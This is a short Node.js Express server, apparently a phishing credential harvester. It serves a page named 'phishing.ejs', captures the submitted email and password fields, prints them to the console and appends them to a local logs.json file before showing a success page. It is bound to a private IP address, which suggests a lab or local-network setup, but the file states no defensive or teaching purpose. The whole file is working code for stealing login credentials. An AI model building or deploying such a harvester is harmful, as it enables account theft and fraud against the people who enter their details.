var express = require('express');
var app = express();
var bodyParser = require("body-parser");
var fs = require("fs");
var ip = require('ip');

app.use(bodyParser.urlencoded({ extended: true }));

// Set the view engine to render EJS templates
app.set('view engine', 'ejs');

// Serve static files (CSS, JavaScript, etc.) from the "public" directory
app.use(express.static('public'));

app.get("/", function(req, res) {
  res.render("phishing.ejs");
});

app.post("/", function(req, res) {
  var username = req.body.usermail;
  var password = req.body.userpass;
  password = JSON.stringify(password, null, 2);
  username = JSON.stringify(username, null, 2);
  console.log(username + "->" + password);
  var data = username + "->" + password + "\n";
  fs.appendFile('logs.json', data, function(err) {
    if (err) {
      console.log(err);
    }
  });
  res.render("success.ejs");
});

// Get the local IP address of the server
var serverIp = "192.168.47.1"    //ip.address();

app.listen(3000, serverIp, function() {
  console.log("Server listening on " + serverIp + ":3000");
});
